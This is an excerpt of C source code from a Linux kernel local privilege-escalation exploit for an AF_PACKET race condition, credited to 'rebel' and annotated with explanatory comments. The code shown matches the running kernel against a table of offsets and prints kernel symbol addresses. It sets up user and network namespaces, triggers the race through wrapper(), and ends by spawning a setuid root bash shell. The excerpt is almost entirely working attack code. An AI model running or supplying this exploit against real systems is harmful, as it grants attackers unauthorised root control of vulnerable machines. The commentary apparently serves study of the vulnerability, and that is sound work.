        chmod("/proc/self/exe",06755);
        exit(-1);
    }

    // This is the final stage4. It's simply executing /bin/bash. This is effectively executing a root owned, SETUIDed bash shell.
    else if(getuid() != 0 && geteuid() == 0 && !crash) {
        setresuid(0,0,0);
        setresgid(0,0,0);
        execl("/bin/bash","bash","-p",NULL);
        exit(0);
    }

    // Thank you rebel for the awesome exploit. :D
    fprintf(stderr,"linux AF_PACKET race condition exploit by rebel\n");

    uname(&u);

    if((f = strstr(u.version,"-Ubuntu")) != NULL) *f = '\0';

    snprintf(buf,512,"%s %s",u.release,u.version);

    printf("kernel version: %s\n",buf);

    // Searching through the "struct offset offsets[]" to see if the current version of the kernel is compatible with the exploit.
    for(i=0; offsets[i].kernel_version != NULL; i++) {
        if(!strcmp(offsets[i].kernel_version,buf)) {

            while(offsets[i].proc_dostring == 0)
                i--;

            off = &offsets[i];
            break;
        }
    }

    // if crash flag is set, simply let it crash on $RIP=0xffffffff41414141 when our crafted timer_list object's function pointer is called.
    if(crash) {
        off = &offsets[0];
        off->set_memory_rw = 0xffffffff41414141;
    }

    if(off) {
        printf("proc_dostring = %p\n",(void *)off->proc_dostring);
        printf("modprobe_path = %p\n",(void *)off->modprobe_path);
        printf("register_sysctl_table = %p\n",(void *)off->register_sysctl_table);
        printf("set_memory_rw = %p\n",(void *)off->set_memory_rw);
    }

    if(!off) {
        fprintf(stderr,"i have no offsets for this kernel version..\n");
        exit(-1);
    }

    pid = fork();

    if(pid == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if(unshare(CLONE_NEWNET) != 0)
            fprintf(stderr, "failed to create new network namespace\n");

        // this is where the magic happens.
        wrapper();
        exit(0);
    }

    // wait for the forked exploit process to finish
    // That is, wait for write access to be granted to VSYSCALL, and wait for creation of "/proc/system/hack".
    waitpid(pid, &status, 0);

    // launch stage3 & stage4
    launch_rootshell();
    return 0;
}
